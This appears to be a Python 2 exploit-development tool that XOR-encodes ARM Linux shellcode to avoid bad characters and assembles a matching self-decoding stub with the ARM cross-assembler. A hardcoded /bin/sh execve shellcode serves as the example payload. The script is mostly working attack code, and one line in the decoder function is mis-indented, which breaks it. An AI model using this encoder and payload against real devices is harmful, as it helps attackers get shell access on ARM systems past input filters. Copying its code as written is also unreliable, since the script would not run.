#!python
import os
import tempfile

# Assembler 
BIN_AS = '/usr/bin/arm-linux-gnueabi-as'
# Linker
BIN_LD = '/usr/bin/arm-linux-gnueabi-ld'
# Objcopy
BIN_OC = '/usr/bin/arm-linux-gnueabi-objcopy'


def cleanup(fn):
    for f in fn:
        if os.path.exists(f) == True:
            try:
                os.unlink(f)
            except:
                pass

def MakeXOR(size, xor=0x58):
MAX_SC_SIZE = 256
    LOOP_SC_SIZE = MAX_SC_SIZE - size

    XOR="""
    .global _start
    .section .text

    _start:
        add r6, pc, #36+4
        bx  r6

    main:
        mov r4, #%s
        #add r6, lr, #4
        mov r6, lr

    loop:
        cmp r4, #%s
        bxhi r6
        sub r4, r4, #%s
        ldrb r5, [lr, r4]
        eor  r5, r5, #%s
        strb r5, [lr, r4]
        add  r4, r4, #%s
        
        b loop
        bl main

    scode:
    """ % (LOOP_SC_SIZE, MAX_SC_SIZE, LOOP_SC_SIZE, xor, LOOP_SC_SIZE+1)

    fn = tempfile.mktemp() # binary file
    fn_s = fn + '.s' # as file
    fn_o = fn + '.o' # ld file
    fn_raw = fn + '.raw' # objcopy 
    will_be_deleted = [fn, fn_s, fn_o, fn_raw]

    # write a source
    open(fn_s, 'w').write(XOR)

    # compile a source
    COMPILE = '%s %s -o %s' % (BIN_AS, fn_s, fn_o)
    os.system(COMPILE)
    if os.path.exists(fn_o) == False:
        print "Failed to compile a source: %s" % (fn_s)
        cleanup(will_be_deleted)
        return ""

    # link an object
    LINKING = '%s %s -o %s' % (BIN_LD, fn_o, fn)
    os.system(LINKING)
    if os.path.exists(fn_o) == False:
        print "Failed to link an object: %s" % (fn_o)
        cleanup(will_be_deleted)
        return ""

    # objcopy 
    OBJCOPY = '%s -I elf32-little -j .text -O binary %s %s' % (BIN_OC, fn, fn_raw)
    os.system(OBJCOPY)
    if os.path.exists(fn_raw) == False:
        print "Failed to make a raw file: %s" % (fn)
        cleanup(will_be_deleted)
        return ""

    f = open(fn_raw,'rb').read()
    cleanup(will_be_deleted)

    return f

def findXorKey(sc, bc=['\x00', '\x0a']):
    """find XOR key to scramble and to avoid all of bad chars such as 0x00
        arg:
            sc (str): shellcode
            bc (list): bad chars to avoid

        return:
            key (int): XOR key

        Examples:
            >>> print findXorKey(sc)
            2
    """
    size = len(sc)
    bcs  = bc
    for i in range(0x01, 0xFF+1):
        key = i
        for s in sc:
            x = (ord(s) ^ i)
            if chr(x) in bcs:
                key = -1
                break
        if key != -1:
            return key
    return -1


def encodeShellcode(sc, key):
    """encodes shellcode with key to avoid all of bad chars such as 0x00
        arg:
            sc (str)     : shellcode
            key (int/str): XOR key

        return:
            xoredSC (str): XORed Shellcode

        Examples:
            >>> print encodeShellcode(sc, findXorKey(sc))
            '\x0e\x02\x8d\xe0\x02"\xa2\xe1\x07\x02/\xeb\x0f\x12\xa2\xe3\t\x02\x92\xed-`kl-qj\x02'
    """

    xsc = ''
    for i in range(0, len(sc)):
        xsc += chr( ord(sc[i]) ^ key )
    
    return xsc

if __name__ == '__main__':
    # /bin/sh
    SC = "01608fe216ff2fe102a000220b2705b4694601df2f62696e2f7368000000c046".decode('hex')

    # find xor key to xor the shellcode
    key = findXorKey(SC)
    print "Found a xor key:", key
    # encode with xor key
    XORSC = encodeShellcode(SC, key)
    # build a decoder
    XORER = MakeXOR(len(XORSC), key)
    #print (XORER + XORSC)
    print repr(XORER)
